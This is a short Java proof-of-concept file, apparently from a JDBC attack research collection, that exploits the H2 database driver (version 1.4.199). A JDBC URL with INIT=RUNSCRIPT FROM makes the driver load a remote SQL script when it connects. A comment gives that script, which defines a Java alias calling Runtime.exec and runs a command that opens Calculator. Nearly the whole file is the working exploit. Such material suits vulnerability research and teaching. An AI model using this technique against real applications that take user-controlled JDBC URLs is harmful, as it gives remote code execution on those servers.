package org.su18.jdbc.attack.h2;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * 依赖版本 1.4.199
 * 驱动名称 org.h2.Driver
 * 攻击方式 RUNSCRIPT FROM
 * poc.sql CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "su18";}';CALL EXEC ('open -a Calculator.app')
 *
 * @author su18
 */
public class AttackH2ByRunScript {

	public static void main(String[] args) throws Exception {
		// 装载驱动
		Class.forName("org.h2.Driver");

		String connectionUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8001/poc.sql'";

		// getConnection 触发漏洞
		Connection connection = DriverManager.getConnection(connectionUrl);
		connection.close();
	}

}
